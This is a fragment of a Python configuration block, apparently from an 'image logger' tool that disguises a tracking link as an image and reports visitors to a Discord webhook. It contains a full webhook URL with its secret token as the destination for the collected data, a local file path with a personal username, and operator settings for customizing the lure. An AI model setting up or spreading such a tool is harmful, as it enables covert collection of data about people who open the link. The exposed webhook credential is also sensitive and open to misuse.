...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1080903979719999539/p6KaCiHr6LQSIZNb0yvHzznB5bR8keX4ee30c1rCV7qyd6EOPcStAfeiFHS_FcUbv8Es",
    "image": "file:///C:/Users/noora/OneDrive/Documents/eco_test.pdf", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Eco_test", # Set this to the name you want the webhook to have
